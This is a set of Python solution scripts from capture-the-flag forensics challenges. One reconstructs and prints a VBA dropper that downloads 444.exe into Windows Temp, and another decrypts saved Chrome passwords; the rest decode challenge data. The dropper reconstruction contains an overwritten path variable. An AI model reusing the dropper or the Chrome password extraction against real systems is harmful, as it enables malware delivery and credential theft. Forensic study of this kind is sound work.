        # master_key = self.load_master_key()
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[
            1
        ]

        print("Connecting to database")
        logins = self.connecting_db()

        url = logins[0][0]
        username = logins[0][1]
        password = logins[0][2]
        print(password)
        # decrypted = self.decrypt_password(password, encrypted_key)
        decrypted = self.decrypt_password(password, master_key)

        print(decrypted)

	# /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

	# /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)

	# /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def decrypt_password(self, ciphertext, secret_key):
        try:
            # (3-a) Initialisation vector for AES decryption
            initialisation_vector = ciphertext[3:15]
            # (3-b) Get encrypted password by removing suffix bytes (last 16 bits)
            # Encrypted password is 192 bits
            encrypted_password = ciphertext[15:-16]
            # (4) Build the cipher to decrypt the ciphertext
            cipher = self.generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = self.decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()
            return decrypted_pass
        except Exception as e:
            print("%s" % str(e))
            print(
                "[ERR] Unable to decrypt, Chrome version <80 not supported. Please check."
            )
            return ""

	# /home/figaro/CTF/Categories/Forensics/NTUA/Givaway/payloads/solution.py
    def translated(self):  # Reconstructing the strings based on the VBA code logic
        part_1 = (
            "https://elvesfactory/"
            + chr(ord("H"))
            + chr(84)
            + chr(ord("B"))
            + ""
            + chr(123)
            + ""
            + chr(84)
            + chr(ord("h"))
            + "1"
            + chr(125 - 10)
            + chr(ord("_"))
            + "1s"
            + chr(95)
            + "4"
        )
        part_2 = "_" + "present".replace("e", "3") + chr(85 + 10)
        part_3 = "everybody".replace("e", "3")
        part_3 = part_3.replace("o", "0") + "_"
        part_4 = (
            chr(ord("w"))
            + "4"
            + chr(110)
            + "t"
            + chr(115)
            + "_"
            + chr(ord("f"))
            + "0"
            + chr(121 - 7)
            + chr(95)
        )
        part_5 = "christmas".replace("i", "1")
        part_5 = part_5.replace("a", "4") + chr(119 + 6)

        # Resultant concatenated string for "strRT"
        part_6 = part_1 + part_2 + part_3 + part_4 + part_5

        # Generating the 'strTecation' path
        part_7 = "c:\\" + chr(ord("W")) + "indows\\" + chr(ord("T")) + "emp\\444.exe"

        # Placeholder for variable `mttt`, assuming it is defined elsewhere
        mttt = 120  # Adjust as per VBA code logic
        part_7 = (
            'CreateObject("MSXML2.'
            + chr(mttt - 54)
            + chr(mttt)
            + chr(mttt - 11)
            + chr(mttt - 12)
            + chr(72)
            + chr(84)
            + chr(84)
            + chr(80)
            + '")'
        )

        # Simulating VBA code file writing
        output_lines = []
        output_lines.append(f"strRT = {part_6}")
        output_lines.append(f'strTecation = "{part_7}"')
        output_lines.append(f"Set objXMLHTTP = {part_7}")
        output_lines.append('objXMLHTTP.open "GET", strRT, False')
        output_lines.append("objXMLHTTP.send()")
        output_lines.append("If objXMLHTTP.Status = 200 Then")
        output_lines.append('Set objADOStream = CreateObject("ADODB.Stream")')
        output_lines.append("objADOStream.Open")
        output_lines.append("objADOStream.Type = 1")
        output_lines.append("objADOStream.Write objXMLHTTP.ResponseBody")
        output_lines.append("objADOStream.Position = 0")
        output_lines.append(f"objADOStream.SaveToFile {part_7}")
        output_lines.append("objADOStream.Close")
        output_lines.append("Set objADOStream = Nothing")
        output_lines.append("End if")
        output_lines.append("Set objXMLHTTP = Nothing")
        output_lines.append('Set objShell = CreateObject("WScript.Shell")')

        # Printing the output lines (would typically write to a file)
        for line in output_lines:
            print(line)

        # Values of constructed variables for validation
        print("Constructed Values:")
        print("HPkXUcxLcAoMHOlj:", part_1)
        print("cxPZSGdIQDAdRVpziKf:", part_2)
        print("fqtSMHFlkYeyLfs:", part_3)
        print("ehPsgfAcWaYrJm:", part_4)
        print("FVpHoEqBKnhPO:", part_5)
        print("strRT:", part_6)
        print("strTecation:", part_7)

	# /home/figaro/CTF/Categories/Forensics/NTUA/Givaway/payloads/solution.py
    def main(self):
        self.translated()

	# /home/figaro/CTF/Categories/Forensics/NTUA/ICMP_Party/payloads/solution.py
    def get_packets_icmp(self, packets=None):
        """
        Description:
        Get all the ICMP packets from the packets

        Args:
            packets (list, optional): List of packets to search in. Defaults to None.

        Returns:
            list: List of ICMP packets
        """

        if packets is None:
            packets = self.packets

        icmp_packets = [packet for packet in packets if packet.haslayer("ICMP")]

        return icmp_packets

	# /home/figaro/CTF/Categories/Forensics/NTUA/ICMP_Party/payloads/solution.py
    def get_packet_ttl(self, packets=None):
        """
        Description:
        Get the TTL of all the ICMP packets

        Args:
            packets (list, optional): List of packets to search in. Defaults to None.

        Returns:
            list: List of TTL of the ICMP packets
        """
        if packets is None:
            packets = self.packets

        icmp_ttl = [packet.ttl for packet in packets]

        return icmp_ttl

	# /home/figaro/CTF/Categories/Forensics/NTUA/ICMP_Party/payloads/solution.py
    def main(self):
        self.pcap_open()
        icmp_packets = self.get_packets_icmp()
        ttl = self.get_packet_ttl(packets=icmp_packets)

        flag = ""
        for i in ttl:
            if i != 64:
                flag += chr(i)
        print(flag)

	# /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def main(self):
        text = self.textFromPDF()
        partial_flag = "NH"
        shift = self.rot_bruteforce(text, partial_flag)
        # ROT47
        print(f"Shift: {shift}")
        flag = self.rot(text, shift)
        self.flag = flag
        print(f"Flag: {flag}")

	# /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def rot_bruteforce(self, crypted_text, known_text, max_shift=94):
        """
        Brute forces ROT47 shifts to find the one that contains the known text.

        Args:
            crypted_text (str): The encrypted text.
            known_text (str): The known plaintext to look for.
            max_shift (int): The maximum shift to attempt (ROT47 has 94 shifts).

        Returns:
            int: The shift that contains the known text, or -1 if not found.
        """
        for shift in range(1, max_shift):
            decrypted_text = self.rot(crypted_text, shift)
            if known_text.lower() in decrypted_text.lower():
                return shift
        return -1

	# /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def rot(self, text, shift):
        """
        Applies the ROT47 cipher to the given text with the specified shift.

        Args:
            text (str): The input text.
            shift (int): The ROT47 shift amount.

        Returns:
            str: The transformed text.
        """
        return "".join([self.rot_char(c, shift) for c in text])

	# /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def rot_char(self, c, shift):
        """
        Rotates a single character using the ROT47 cipher.

        Args:
            c (str): The input character.
            shift (int): The ROT47 shift amount.

        Returns:
            str: The rotated character.
        """
        ascii_code = ord(c)
        if 33 <= ascii_code <= 126:  # ROT47 only affects printable ASCII
            return chr((ascii_code - 33 + shift) % 94 + 33)
        return c

	# /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def textFromPDF(self, file=None):
        """
        Extracts text from a PDF file.

        Args:
            file (str): Path to the PDF file. Defaults to the challenge file.

        Returns:
            str: The extracted text.
        """
        if file is None:
            file = self.challenge_file

        with pdfplumber.open(file) as pdf:
            text = ""
            for page in pdf.pages:
                text += page.extract_text()
        return text

	# /home/figaro/CTF/Categories/Forensics/HTB/Fake_Boost/payloads/solution.py
    def main(self):
        self.challenge_file = self.Path(self.folder_data, self.file)

        self.aes_key_base64 = "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k="
        self.aes_key = base64.b64decode(self.aes_key_base64)
        encrypted_base64 = open(self.challenge_file, "r").read().strip()
        decrypted_text = self.decrypt_string(encrypted_base64, self.aes_key)
        print("Decrypted text:", decrypted_text)

	# /home/figaro/CTF/Categories/Forensics/HTB/Fake_Boost/payloads/solution.py
    def decrypt_string(self, encrypted_base64, key):
        full_data = base64.b64decode(encrypted_base64)

        iv = full_data[: AES.block_size]
        encrypted_message = full_data[AES.block_size :]

        cipher = AES.new(key, AES.MODE_CBC, iv)

        decrypted_bytes = cipher.decrypt(encrypted_message)

        pad = decrypted_bytes[-1]
        decrypted_bytes = decrypted_bytes[:-pad]

        return decrypted_bytes.decode("utf-8")

	# /home/figaro/CTF/Categories/Forensics/HTB/Binary_Badresources/payloads/solution.py
    def main(self):
        encrypted_text = "ZzfccaKJB3CrDvOnj/6io5OR7jZGL0pr0sLO/ZcRNSa1JLrHA+k2RN1QkelHxKVvhrtiCDD14Aaxc266kJOzF59MfhoI5hJjc5hx7kvGAFw="

        password = "vudzvuokmioomyialpkyydvgqdmdkdxy"

        decrypted_text = self.decrypt(encrypted_text, password)
        print("Decrypted text:", decrypted_text)

	# /home/figaro/CTF/Categories/Forensics/HTB/Binary_Badresources/payloads/solution.py
    def derive_key_and_iv(self, password, salt, key_length, iv_length):
        d = SHA256.new()
        d.update(password.encode("utf-8"))
        key = d.digest()[:key_length]
        iv = salt.encode("utf-8")[:iv_length]
        return key, iv

	# /home/figaro/CTF/Categories/Forensics/HTB/Binary_Badresources/payloads/solution.py
    def decrypt(self, ciphertext_base64, password):
        ciphertext = base64.b64decode(ciphertext_base64)
        salt = "tbbliftalildywic"

        key, iv = self.derive_key_and_iv(password, salt, 32, 16)

        cipher = AES.new(key, AES.MODE_CBC, iv)

        plaintext = cipher.decrypt(ciphertext)

        plaintext = plaintext.rstrip(b"\x00")

        return plaintext.decode("utf-8")

	# /home/figaro/CTF/Categories/Forensics/HTB/Data_Siege/payloads/solution.py
    def main(self):
        # Get packets from the pcap file
        self.pcap_open()

        tcp_stream_5 = self.get_tcp_stream(5)

        tcp_stream_5 = self.creating_stream(packets=tcp_stream_5)[0]

        # To get the payload
        data_24 = bytes(tcp_stream_5[25][TCP].payload)
        data_45 = bytes(tcp_stream_5[45][TCP].payload).decode()

        # print(base64.b64decode(data_24))

        payload_base64 = data_45.split('"')[1]

        payload = base64.b64decode(payload_base64).decode()
        print(payload)

	# /home/figaro/CTF/Categories/Forensics/HTB/Data_Siege/payloads/solution.py
    def get_tcp_stream(self, number):
        tcp_streams = self.creating_stream()
        return tcp_streams[number]

	# /home/figaro/CTF/Categories/Forensics/HTB/Data_Siege/payloads/solution.py
    def stream_identifier(self, pkt):
        if TCP in pkt:
            src = pkt[IP].src
            dst = pkt[IP].dst
            sport = pkt[TCP].sport
            dport = pkt[TCP].dport
            # Create a unique identifier for both directions
            return tuple(sorted([(src, sport), (dst, dport)]))
        return None

	# /home/figaro/CTF/Categories/Forensics/HTB/Data_Siege/payloads/solution.py
    def creating_stream(self, packets=None, save=False, return_dict=False):

        if packets is None:
            packets = self.packets

        # Dictionary to hold streams
        tcp_streams = {}

        # Iterate over packets to group them into streams
        for pkt in packets:
            if TCP in pkt:
                stream_id = self.stream_identifier(pkt)
                if stream_id:
                    if stream_id not in tcp_streams:
                        tcp_streams[stream_id] = []
                    tcp_streams[stream_id].append(pkt)

        if return_dict:
            return tcp_streams

        tcp_streams = list(tcp_streams.values())

        return tcp_streams

	# /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.folder_logs = self.Path(self.folders["files"], "Logs")
        self.folder_xml = self.Path(self.folders["data"], "xml")

	# /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def xor_decrypt(self, data: bytes, key1: bytes, key2: bytes = None) -> bytes:
        output = bytearray(len(data))
        key1 = bytearray(key1)
        if key2:
            key2 = bytearray(key2)
        for i in range(len(data)):
            k1 = key1[i % len(key1)]
            if key2:
                k2 = key2[i % len(key2)]
                output[i] = data[i] ^ k1 ^ k2
            else:
                output[i] = data[i] ^ k1
        return bytes(output)

	# /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def emilia_main(self):

        # Key from $a53Va (known good key)
        # NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg==
        key1_b64 = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
        key1 = base64.b64decode(key1_b64)
        # key1 = base64.b64decode(key1)

        # Read the encrypted .secured file (Base64-encoded)
        with open(self.challenge_file, "rb") as f:

            encrypted_b64 = bytearray(f.read())

        encrypted_data = base64.b64decode(encrypted_b64)

        # Try decrypting with single key
        decrypted_data_1 = self.xor_decrypt(encrypted_data, key1)

        # Try decrypting with both keys (if key2 is usable)
        # So one key is weird because in the powershell script it tried to decode it with UTF-8 and i think that would lead to an error
        # So there is a chance that only one key is used due to the try-catch brackets leaving one key null but im not sure.
        key2_str = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"

        try:
            key2 = base64.b64decode(key2_str)
            decrypted_data_2 = self.xor_decrypt(encrypted_data, key1, key2)
        except Exception as e:
            print(f"[!] Dual-key decode failed: {e}")
            decrypted_data_2 = None

        # Save both outputs as .bin files for analysis
        output_single_key = self.folfil("data", "output_single_key.bin")
        with open(output_single_key, "wb") as f:
            f.write(decrypted_data_1)
            print("[+] Decrypted with single key -> output_single_key.bin")

        if decrypted_data_2:
            output_dual_key = self.folfil("data", "output_dual_key.bin")
            with open(output_dual_key, "wb") as f:

                f.write(decrypted_data_2)
                print("[+] Decrypted with both keys -> output_dual_key.bin")

        key3_b64 = "5xsGObjHQiPAGdzLgBEeI8u0YSJq76Eiyuf8wARS7qbtP4ntQY50yH8dzKZeCAsZn2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"
        key3 = base64.b64decode(key3_b64)
        decrypted_data_3 = self.xor_decrypt(encrypted_data, key3)
        output_join_key = self.folfil("data", "output_join_key.bin")
        with open(output_join_key, "wb") as f:
            f.write(decrypted_data_3)
            print("[+] Decrypted with join key -> output_join.bin")

	# /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def getting_base64(self):
        sysmon_file = self.Path(
            self.folders["data"], "emilia", "Sysmon_Operational.txt"
        )
        with open(sysmon_file, "r") as f:
            text = f.read()
        base64_strings = self.custom_re_match_base64_string(text)

        result = b""

        for base64_string in base64_strings:
            decoded = base64.b64decode(base64_string)
            result += decoded
        return result

	# /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def custom_re_match_base64_string(self, text: str, strict=False) -> list[str]:
        """
        Description:
        Find the base64 string in the text

        Args:
            text (str): Text to search for base64 string
            strict (bool, optional): If True, it will only return the base64 string. Defaults to False.

        Returns:
            str: list of Base64 string found in the text
        """
        if strict:
            base64_pattern = r"[A-Za-z0-9+/]{70,}={1,2}"
        else:
            base64_pattern = r"[A-Za-z0-9+/]{70,}={0,2}"
        base64_strings = re.findall(base64_pattern, text)
        return base64_strings

	# /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def main(self):
        self.emilia_main()

	# /home/figaro/CTF/Categories/Forensics/HTB/Pursue_The_Tracks/payloads/solution.py
    def main(self):
        pass

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.encryption_key = "5UUfizsRsP7oOCAq"

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def pickle_save_data(self, data: any, filename: str, folder: str = "data") -> None:
        """
        Description:
            Save data to a pickle file

        Args:
            data (any): data to write to the pickle file. Can be anything
            filename (str): Filename to save
            folder (str, optional): Folder name inside the ctf folder. Defaults to "data".

        Returns:
            None
        """
        with open(self.folfil(folder, filename), "wb") as f:
            pickle.dump(data, f)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def pickle_load_data(self, filename: str, folder: str = "data") -> any:
        """
        Description:
            Load data from a pickle file

        Args:
            filename (str): Filename to load the data from
            folder (str, optional): Folder name to find the file to load the data from. Defaults to "data".

        Returns:
            any: Data loaded from pickle
        """
        with open(self.folfil(folder, filename), "rb") as f:
            return pickle.load(f)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def load_compressed_data(self):
        """
        Description:
            Challenge specific function to load the compressed data
        """
        self.compressed_data = b'BZh91AY&SY\x8d*w\x00\x00\n\xbb\x7f\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xfe\xee\xec\xe4\xec\xec\xc0?\xd9\xff\xfe\xf4"|\xf9`\r\xff\x1a\xb3\x03\xd1\xa0\x1e\xa9\x11\x07\xac\x9e\xef\x1e\xeez\xf5\xdb\xd9J\xde\xce\xa6K(\xe7\xd3\xe9\xcd\xa9\x93\rS@M\x134&\r\x11\x94xF\x11\xa6\x89\xb2\x99\xa6\x94\xf0\x1ai\xa1\xa6\x9a\x03AF\xd1\x1e\x9e\xa1\x9a\xa7\x89\xa6L\x84\xf5\x1ayC\xd44z\x993S h\r\x0f)\xe9\x03@\x03LG\xa9\xa0\x1a\x04DI\xe8\x19$\xf4\xc9\xe92a\xa3D\xc9\x9aL\x11\x81O\'\xa4\x9e\x935=M\xa4\xd0\xd1\xa6&F\x81\x93L\x86\x80\x00\x00\x06\x80\x00\x00\x00\x00\x00\x00\x00\x00\rM\t4\xd1\x80L\t\x91\x18\xa9\xe4\xc6\x94\xd8\xa7\xb5OS\xc9\xa4=#\xf54\xd4\x06j\x07\xa9\xeaz\x9a\x1e\xa1\xa0z\x86\x83M\x03jh\x00\x03A\xa6@\x1a\x00\x00\x03\xd4\x00\x1e\xa7\x944\x005=\x10\x93\x10\x9b@\x994\xc8\x99\xa3J\x1bM\x1ajyOF\xa6\x98\xcab\x0c\xd16\xa0m&\x8fH\xd3@44\x01\xa0\x00\r\x03@\x004\x19\x00\x00\x00\x004\x1a\x01U44\x00\x03@\xd0\x1a\x0044\xd0\x06@\x1a\x00\x004\xd0\x18\x98\x86@42d\x00h\x1ad\x00\x00\x00\x004h\x00\x00\x00`\x91$Bhh4`\x9a\x19\x04\xc3@\xa9\xedS\xf4S\xd2\x1b\xd4\xda&M&\xd2m#\xcai\xfa\x8c\x93e=@\x1e\x91\xa0z\x8cjh\xd1\xa6\x80\x00\xd0\x004\x1e\xa0\x01\xa0\x1a4i\xb54\xd3\x10\x1f\xdf\xcb\x98\x99\r\xa1\r\x8c`\xd86\x0cd\xe9\xc3\x06\x9bm6\xdbm\x1b\xf1"\xf0\xd2\xa7\xd5p,\x171gAcG]V\xcfvr\x9e\r\x9d=\x13?N\xfa\x8bw3l`\x0e\x1c\xda\xdc\xb0VU\xa0\xe7\x8df>$\x10\xb5\xf2+fu\xd6\xd5\xed\x9a\x9c|b\xb1\xc4\xd1P\xd0\x95\xf8\x10\xc0\xb8\xd2\x10\\ 9\x83UF#^H\x12\x12\x91\x98\x9c\x1d\x89BQ\x8eC\x92\x066\x8bDp\x8a\xaa\x03e%\xad\xc4\xe5o\x8f\x01\xa0\x11\x84\xac\xb8H\x01^\xb7\x84y\xed\x0cU\xb37\xd7[w\xddm\xf4\xf9\xdb\xee7\xa6\x98\xe2-A\xea\x1c\xd6\xbe\xbf1\xe2\x03\x89A:2\xb0n\x0b\xc169\x8a\xab\n\\\xa4\xa0\xbb{ \x11\xa7\x1e-\xbc,P`F\xad\x08\xe1\x8dY\x9b\x02,\x8cs#eg%\x97\x071\xda\xe8XA|>\xa1\xae\xaah%\xc4]\x95w*4i[\x85\xee\xee=\xcf\x935q\x02uo"\xaf\x81/\xc0\xca\xbdF;\xf6\xef\xaa\x99A/ \x91\xef\x0b\xe1\xd9\xa4`w\x9e\xc6\x88\xf2\xa9S\xe3\xa6x\xaf|\x0b*IE\x02\x8a(NL\x00]?\x12\x10p=w\xc6\x92G\x8a\xd2\xff\x17}~y3\xe3\xe9f\xf1\xff\xaf\xf2\xa5\xb9\xa5\xcc\xfd;W\xdd\x1e\xcd\x9e\x0bD5\x0b\x0f\xc6wFW\\\xd5\x8d Gh\xc1\n|x2\x99&\x8e\\\xa5Ba\x7f6!\x10\xe4\xd0p\x18\x90\x97k4\x1a\xec@\x1b~~\x8d\xfe\xee\x96\x07\x8f\xd6\xe1SS\xcdOv\x8c\x89\xd2I\x150\xa5\xdd\xaa>E\x07\xdb\xf8l\x97V\xa0\x1c\x8d\xd9\xa50\x17[h\xd1\x02\x08!f\xad\xea\xa0"\x88\xceC\x0c\x0fVG^\xc0\xea_\x10\xbd\xa1m{5IL\xbb\xd2\x9an\x07\xd9a\x98jgIwr&&\x06\x0c\x8aH\xe73\xdd\xb1\x050\x9f\x1f\x1f\xe1J\'\x9d\x8cY\xa8\x11\x0b\x08\x0fd*\xf2\x9d\xc2\x84$\x10\x8a\xd9\xc1\xe05\xecs\xdeC\x9a\xd1\xb7\x85\x0eNiJj2\x9ag\x12\x94M)\xd2\r\xf3\xa8\x84\xc9\xc2\x06\xe1\x14\xda\xd1\x1e\x1bV\x1a\x0b\xe666\xc6~V\x81/r\x98\x95\xf2g\xc7Mm<\xed\xb0\xe9ko\x01\xcb4\x88\x17\x84\x8a"J\x9bJ\x18\x0ch;\x84\tv\xcb\xbaEL\x99\xdf\xaa)q/t:45\xba\xbf\x84V\xf5\xb3\xad\x8c\xee\x11\xe2(\x18>\xea3\xa9\x98\xa8B\xcf\xb5\xdc\xed\xacI<\x90\x06\x1d0)Y@\x86\x07\x7f\xee\xb9\xf5{m\xdf\x83Hf\xb3T\xd2\xdf\x9c\xc6\xab\xac\x13\x99\xcb\xec\xf5K\xf2\x80\xce\x9fC\xf4w\xeb\x1fa\x08\xd8\r\x80<%\x90w\x8b\xe8}\x8d\xda\x96\xcf)\x1a\xbaD.\xa3\xc2\xe5E\xe3\xc9p\xa8&w\x10\x14\xc6$v-I\xd9\xbd\xcf\xbf\xe1\xce\x19\xcdf\x07\x0b\x7f\xd7\xc8:\xa6nw\xfc=M\\n\xc7\x02\x96\n\x85".j\xa8G}\x04\xef\x1e+\xb0)4\x82G_\x05\xfe\xbe\x94\xf3\x03\xd4*\xe2\xf7T\xa8\x97\x97\xc3X\x8a\x9a;\x9a\xbei\xc9\xad\xd1\xd2\xcf\xde4fpz\xce\rY\xa5\xa2s\xad\xf8(S\xf3*\x85\xea$\x14\x18\xb6\x1a\xbb\xc5.O\xc3\xb7\x89\xeb9\x1a4\xd3\xe0\x999r\x99\x9a(\x84\xce\x17\x0bk\xa59\xd2X\x88\x815\xab\x10x\x9f\xb7\xc5\xe7_R\xaa\xaa\xab\xf2\x9e\xe1\xb9\x8aK\x91\xa3\xa1\xa7\xc0\x94\x8f3\xca\x82\x8azY\xc4g\xed\xcf\xa9BO:`\xb5\x1b2\x12\xbb\x89\x17[m\xa2\xe8\xc4\x0ctJ/-\xa5\xbf\xf1\xffq\x7f\xda\x9a\xd9\x00\xb2\x0b\x98L\x7f\x17\xb4\xc9g}\x1e\xfeSh \xc3\x98fIq\x05]\xb1\x8aB\x98\xc7\x94\x03=2&\x06v@s\x0fX\xb3\xadZ\xcf\xac\xf6\xae\xe2\x0b\xaa\xe4\x99\xf3\xf5<\xd7\x81mu\x87\xb5\x97\xd2\xc3\xb4p\xb5\xad\xd9y\x15\xf2\x06,\xa7;\xe2\xe4\xcaH\xbf\xd5\x92@\xae\x0c\x91\xddD\x9by\xd5\xccj\x7f\xa9\x19\xad\xa3\x07\xbdI\x84\xa9|k/\x0f7=ji\x12\xba\xd4\xfaI\x8c\xa9\x94\n\x9b\xa43\x0e\xa6O\xd3\x8d\xf5\x83\x06\xd8\xaehhl\x05*;\xda\xaa\xd9he\xc8\x8f2!\x98\xd6-B\xa9\xcf\x9a\xb9_\xa4\xec\xda\x08<\xe3\r\xeem\x1el\xd8\xfc}3\xc4\xbal\xe5,P\xe4^\xae-\x97\x91j0\xec\xc8bB\x85\xd1.\xf5T\xa4\xf1\x83\x89\xc4-\\\x00\xf0\xbb\x1a\xd2\x89K\xb58\x96\xe2\x88\xdd<q\r\xbb0\xc4Ac\x95.v\x94\x08>\xca\x8b\xf5\xa1\xaf\x1fVH\x16\n\xfe+\x02\x9f\xe9\xa7VP\x1a\x03m\x01\xab\x0b\xf8\xd1&\xacq\xadg\x0f\xfc\x98N\x91XRQ\x88\xcf- 4K\x84q"\xec\xb2\x8c\xe6e\x86 \x9ff\x10\x83p\xc5\xc1C\xf4\x8c5\xda\xe5\x82)\xcf\n\xbfWZ\xc0\xd1\x9b`\xacFt\xba\xed\xaf#\xc8\xf8\x96\xe9=Zd\xa4h\xa3d>\xb2\xec\xac\x98\xe6%\xca\xb2r\xe2\xd7\xb5\x80\x8c\x1cb0\xadC\x8a\xdb\x1e\x1d\x9ek\xf0>\xcf\'7=\x9b\x19\xdee@\n\xaa\xac\xd2N%$\x91]\xa7\x13c\xe7\xce\x95\x96\x81Yh\nS\xd1\xdc\xb5\xe3d{\x13\xc5\xeau22\xcc\xec\xe1\x19\xb6\n\x8e?\n\x01\xdey\x04t\x02"@\x82\x12J\x88\x86\x1b\x83Un\x03Uy\xed\x82\xc3\x19\xdd\x86\r\xda\x1a\xde\x7f\x14\x90\xb3\xaf?\x05\xd3\xf0\x05\xe9\x85\x83\x99m\x8ae\x86\xd59Zl\x83i\x04u<\x92]\xe9\xca\xbc\xf5k\xcd\x8e,\xc1\xfcU\xc7\x84%|>\xfbt\x9c\x04\xf0}\xceQ|Wy\x9eN\xa8\x19#\x12\x94\xf1\xfdX5`\x19\x0e\x87NwC\xa5\x80p\xb1\xd9\xc73F\xe8\xa5\x9c\x00\xe5\xb1)\xd3]\xa6\r\x9d\x1a\xdd\xa4\x91\xb9z}\x1bg\x12\x9e<\nB\x88\x0e\xdf:\x1c\t\xc3\xa3\x85\x1b\x98y\xec\x0c\x9a\x12Pr\xcdC\xea1\x7f\x01\xef\xc3\xb0\xdd16\xe7\x1e\xf7\x1fv4\x17\r\xd3\x86\xceE@\xce\x15T\xce\x00\xf3@\xd9\r\x05\x19@V\x1c"\x86\xa6\x9c&,\x05\xa6%\x02n(^9\x86\xa65#\xc8\xb5]\x88\x8e\xa2,1\xc3u2\xe0\xa8 \x01\xff"|\xffG\x0b6\xbeU\x8a\xf7;YD\xda\xb4u)l\xf6~\'\x0e\x9b\xb3/\x98Q1\x04\x12JI[\x11*\x81\t\x07\xcb\xadw\xc9\xbf\xbf\xbe\xbaa\xc6\xce\x9e)\x98v\x15\x01j\xa15\xbd\xd0\xcb.\xe3\xd7\xa2`\x15\x9e\x854\xd3\x1am\r\x13A\x9a\xa5\x0b\r\x81\r\xb9\xb3%)Bmr\x12L\r>\x87\x07K\xea\xden\x87\x01c6%\xea\xa5\xd8\xb54\xc0\xca\xb8SBd{O\x9c \x88\x86\xee-80\x81Vv\x08[P\xc221\x9e &,t\x11/9\xe0\xd0\x1f\x1d\xcd\x94\xb9\x95\xc7V\xcb\xd6\xf2M\xf7\xf4gT\xa2\x19\x94\xd9\xfb\x7f\x15\x90\xc5\xb2&\x9e}\x0cq\xe8\xdc(\x1a{l\\\x88\xb8\xab=\x8b\xaaCm\xc0\xcb\xb5w=\xf8\xff\xa3\xdfY\x94\xa5\xa5\x9d0\x04U\x8al\xb8iw\xa3\xb0%\xf1 \x03H\x80\xc9$v\xe6\x98|#DYP\xa4\xfe\'\x04\xe0&\x88+\xeb\xce:\xa0cm,\x1aQ\xfdN\x1c\x97\xa3\x98\xb5q\x1c\xefE\xabEC\xaa\x82\x00\x8c\xcb\xee\x8d\xd6l\xe5\\\xca;\xf9d\xd4\xa5\xaen\xfaW=\x88kU9\xfe\x95&c\x13\x0cL7+5\xe2\xde_\x9f\xf6t\x05Hn\xe2\xff\x9dzi\x9a\x03@`u\xea\x98\xb5\x8e\xd9\xa3W\x85\x96O\x85\x9bf\xc1\xb6\xa4x\xa2/=\x0f\xa6T\xde\xac\xc6\x84\\\xa5q \x8eZ\xd5p*-qC%\xec\x85aH\x90>\xc1\x97%B@\x12B"u\xd5R\x0f\x10`&\x9ai\x1cl*F\xefOr\xaee\xaf\xa9\x88q\xa2k93\xe6\xf6\xf5\xa8n\xd0\xf42\xe5<\xf7}\xad\xdc\xd4)L\x11\x97\xd4\x92\x11E\xe1\xa0\xa4\xe4{\x9a\xe6T\xda \xee\x83\xb7\xce\x17\xb0\xb3\x0c\x11\x8f\xc1t\x0c\xb5\x87\x9e\xbb\x0f\x0fql\xe8T\xc5\x02+E\xdd\xbcQ\x92\xb8\xb8\xc8*,(K\tUk\x16\t\x86\xb9@\'\x04\xc1l&\xcf)\x1f\x14V\x0b\x80\xd2\r\xab\xec\x07) \x0c\x0f\x80\xee\x16\x14\xf9\x9c\xcbKE\xed`;5\xa9\xc2\x105X[\x87\xd6j\x95\x18\xcaY\x99\xba\xe6\xe8\x04q\x8344\xceW\x00\x05\xc4\x15\xfb\x82\xea9\xfcJ\xa3L\x8e\n\xc1\xb4\xb3sY\x84`\x98\x99\xccy\x0f{\x02P\x8e\n\xb3\xe5\xeclN\xa8\xb5]\x84!I\x80\xa4\x8at&\xe4eu\xba\x15T\x1fv\x90fx\x81P9\x1a\xf5G\xa9\xa2\x9c\xed\xc4W\xa0\xbb\xa5j\x1e\x1b\xd9%J\xb3z1I`\x19s\xd9\xb0\\\xca\xfdd\xd54!\x829\xc2|\x0c\xed\xdb\x0e\xde:\xcb%l-\xf6\x8f\xef\xde\xe2\xa5h\xb6e\xc5\xc7!\xc6 